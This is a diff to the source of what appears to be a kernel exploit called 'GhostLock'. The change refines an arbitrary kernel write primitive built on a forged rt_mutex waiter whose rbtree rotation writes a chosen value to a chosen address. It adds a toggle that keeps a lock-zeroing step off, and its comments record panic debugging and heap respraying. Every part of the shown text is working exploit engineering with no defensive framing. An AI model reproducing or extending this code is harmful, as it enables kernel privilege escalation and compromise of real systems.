@@ -136,6 +136,17 @@ static int multicast_prep_enabled(void) {
     return cached;
 }
 
+/* A2 (fixture lock normalisation) stays off: it silences the panic but also
+ * removes the rbtree rotation that performs the target write. */
+static int multicast_prep_lock_enabled(void) {
+    static int cached = -1;
+    if (cached < 0) {
+        const char *v = getenv("GHOSTLOCK_MCAST_PREP_LOCK");
+        cached = (v && v[0] == '1' && v[1] == '\0') ? 1 : 0;
+    }
+    return cached;
+}
+
 /* Ask the worker to stamp the buffer again (it owns the kernel frame). */
 static void multicast_request_respray(MulticastWaiterRouteContext *context,
         uintptr_t target, uintptr_t value) {
@@ -418,10 +429,12 @@ int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
             pr_info("mcast prep: [%#zx] <- 0 ret=%ld\n", addr, rr);
         }
         /* A2: the same for the fixture lock the forged waiter points at.
-         * The panic proved the walk dereferences a field of that lock and got
-         * ASCII garbage (x10 = 0x6667202828282967) - the slot is not a valid
-         * rt_mutex, so zero wait_lock / waiters.rb_root / rb_leftmost / owner. */
-        if (context->layout.lock_slot_count) {
+         * OFF by default: the lock's owner/waiters fields carry the write -
+         * zeroing them keeps the walk from panicking but also removes the
+         * rbtree rotation that produces the target write (measured: ret=0 but
+         * "Write 1 failed"). Enable with GHOSTLOCK_MCAST_PREP_LOCK=1 only when
+         * deliberately testing the "clean lock" hypothesis. */
+        if (multicast_prep_lock_enabled() && context->layout.lock_slot_count) {
             const size_t n = context->layout.lock_slot_count;
             const size_t used = (context->lock_slot + n - 1) % n;
             const uintptr_t slot = context->lock + context->layout.lock_slots_offset +
